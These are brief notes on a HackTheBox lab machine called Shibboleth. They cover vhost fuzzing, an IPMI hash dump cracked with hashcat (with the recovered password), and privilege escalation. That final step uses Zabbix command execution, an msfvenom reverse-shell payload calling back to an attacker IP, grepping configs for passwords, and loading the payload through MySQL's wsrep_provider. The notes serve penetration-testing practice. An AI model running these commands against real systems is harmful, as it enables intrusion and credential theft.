# Two is better than one
* https://vato.cc/hackthebox-writeup-shibboleth/
* https://infosecwriteups.com/shibboleth-hackthebox-walkthrough-f5c52d8949cf

### ffuf Vhosts Fuzzing
```
ffuf -u "http://shibboleth.htb/" -H "Host:FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302
```

Add them to the hosts
```
monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
```

##### Vhosts vs. Sub-domains
The key difference between VHosts and sub-domains is that a VHost is basically a 'sub-domain' served on the same server and has the same IP, such that a single IP could be serving two or more different websites.

VHosts may or may not have public DNS records.

In many cases, many websites would actually have sub-domains that are not public and will not publish them in public DNS records, and hence if we visit them in a browser, we would fail to connect, as the public DNS would not know their IP. Once again, if we use the sub-domain fuzzing, we would only be able to identify public sub-domains but will not identify any sub-domains that are not public.

This is where we utilize VHosts Fuzzing on an IP we already have. We will run a scan and test for scans on the same IP, and then we will be able to identify both public and non-public sub-domains and VHosts.

### Nmap UDP the Sub-domains
##### Get running ports with rustscan
```

❯ docker pull rustscan/rustscan:latest
❯ docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 10.129.187.84
```
##### Nmap the opening ports
```
❯ sudo nmap -sU -p 623 zabbix.shibboleth.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 20:17 NZDT
Nmap scan report for zabbix.shibboleth.htb (10.129.187.84)
Host is up (0.26s latency).
rDNS record for 10.129.187.84: shibboleth.htb

PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

### Google exploit asf-rmcp
* https://book.hacktricks.xyz/pentesting/623-udp-ipmi

##### Check version and dump hashes
```
hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
```

```
7c52d90982030000c46a8fbe259e2846070afb69ee206ad2e54ddc8fba4f43ff579e27b0442748eaa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:d78f8dffe25735b4e9cc37c51519adb34b60fbaf:ilovepumkinpie1
```

### Others
```
system.run[command]

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=6666 -f elf-so -o elf

grep -iR 'password' /etc/zabbix/

mysql -D zabbix -u zabbix -pPasswordFoundAbove

SET GLOBAL wsrep_provider="/home/ipmi-svc/elf";
```